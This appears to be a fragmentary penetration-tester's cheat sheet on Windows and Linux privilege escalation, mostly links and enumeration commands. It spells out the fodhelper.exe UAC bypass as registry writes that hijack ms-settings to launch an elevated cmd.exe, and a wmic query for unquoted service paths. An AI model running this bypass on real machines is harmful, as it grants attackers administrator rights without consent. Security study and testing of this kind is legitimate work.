# Privilege Escalation

## Windows

### reference

<https://www.fuzzysecurity.com/tutorials/16.html>

### information gathering

```cmd
systeminfo
whoami
net user
net user <username>

```

```powershell
Get-ComputerInfo
```

### UAC bypass

```cmd

Win10 build 1709, 1809 ...
C:\Windows\System32\fodhelper.exe

```cmd
sigcheck.exe -a -m c:\windows\system32\fodhelper.exe

REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
```

### file


### wmic

```bash
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
```

### lolbas-project.github.io

## Linux

### gtfobins.github.io

<https://gtfobins.github.io/>

## Tips

1.

## linpeas
